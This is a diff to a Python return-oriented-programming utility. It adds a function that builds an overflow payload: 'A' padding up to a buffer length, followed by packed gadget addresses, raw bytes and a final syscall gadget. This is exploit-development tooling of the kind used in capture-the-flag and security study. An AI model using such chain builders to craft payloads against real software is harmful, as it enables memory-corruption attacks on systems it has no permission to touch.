@@ -1,4 +1,5 @@
 from struct import pack
+from ReverseExecution import generalToBytes
 
 NULL = b'\0\0\0\0'
 
@@ -187,6 +188,42 @@ def AssemblyToGadget(instruction):
     if instruction[0] == '@':
         return dataaddressToValue(instruction)
     return int(gadgetdictionary[instruction],0)
+
+def AssemblyListToGadgets(instructions, bufflength, dictionary):
+    #Assumes guarantee that all instructions appear in dictionary
+    chain = b'A' * bufflength
+
+    for instruction in instructions:
+        if type(instruction) is bytes:
+            chain += instruction
+            print("adding bytes   : <" + str(instruction) + ">")
+            continue
+
+        if instruction == SYSCALL:
+            chain += pack(PACK_TYPE, int(dictionary[SYSCALL],0))
+            print("adding syscall")
+            break
+
+        if type(instruction) is int:
+            chain += pack(PACK_TYPE, instruction)
+            print("adding address : <" + str(instruction) + ">")
+            continue
+
+        if instruction[0] == '@':
+            chain += generalToBytes(dataaddressToValue(instruction) + DATA_ADDRESS)
+            print("adding address : <" + str(instruction) + ">")
+            continue
+
+        if instruction not in dictionary:
+            print("missing gadget : <" + str(instruction) + ">")
+            continue
+        
+        if instruction in dictionary:
+            chain += pack(PACK_TYPE, int(dictionary[instruction],0))
+            print("adding gadget  : <" + instruction + ">")
+            continue 
+
+    return chain
 
 if __name__ == "__main__":
     dummydict = {
